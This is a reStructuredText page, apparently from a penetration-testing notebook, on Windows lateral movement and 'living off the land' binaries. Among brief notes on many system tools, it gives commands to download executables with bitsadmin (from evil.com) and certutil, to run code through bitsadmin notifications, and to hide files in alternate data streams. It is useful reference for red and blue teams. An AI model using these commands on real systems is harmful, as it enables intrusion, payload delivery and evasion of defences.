Lateral movement
========================================

Common entrances
----------------------------------------
- SMB weak password
- SqlServer weak password

LOLBAS
----------------------------------------

Introduction
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LOLBAS, the full name of Living Off The Land Binaries and Scripts (and also Libraries), is a free utilization method. It was discovered by Christopher Campbell and Matt Graeber at DerbyCon in 2013, and was finally proposed by Philip Goh.

These programs are usually signed by Microsoft or a third-party certification authority, but in addition to completing normal functions, they can also be used for intranet penetration. These programs may be used to: download security malicious programs, execute malicious code, bypass UAC, bypass program control, etc.

Common procedures
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- appsyncvpublishing.exe
    -Execute powershell
- bitsadmin.exe
    - Download file ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``
    - Download file ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``
    - Copy files ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``
    - Code execution ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset``
- cdb.exe
- certutil.exe
    - Can install, backup, delete, manage and execute certificates
    - Certificate storage related functions
    - Download the file ``certutil -urlcache -split -f https://addr/example.exe``
    - Note that certutil has a cache and needs to be deleted explicitly.
    - base64 encoding and decoding ``certutil -encode`` / ``certutil -decode``
- cmd.exe
- cmstp.exe
- control.exe
    - `Load dll <https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/>`_
- csc.exe
    - Compile C# payload
- cscript.exe
    - Execute script
- extexport.exe
- expand.exe
    - Expand one or more compressed files
- forfiles.exe
    - ``forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe``
- mofcomp.exe
- makecab.exe
- msbuild.exe
    - Build applications
- mshta.exe
    - HTML application
- msiexec.exe
    - install msi
    - load dll
- msxsl.exe
    - Handle XSL programs
- netsh.exe
- installutil.exe
    - Install/uninstall program components
- IEExec.exe
    - .NET Framework bundled programs
- powershell.exe
- psexec.exe
    - https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
- reg.exe
    - Registry console
- regedit.exe
    - Registry modification
- regsvr32.exe
    - Register dynamic link library/ActiveX control
- rundll32.exe
    - Execute internal functions in DLL files
- sc.exe
    - View service status management
- schtasks.exe
    - Scheduled tasks
- shred
    - Repeated writing to files prevents file recovery
- type.exe
    - Use ads to hide files ``type <filepath> <target_file:ads>``
- wmic.exe
    - Windows management tools
- windbg.exe
- winrm.exe
- wscript.exe
    - Script engine
- waitfor.exe
    - Used to synchronize computers on the network and can send or wait for signals on the system.
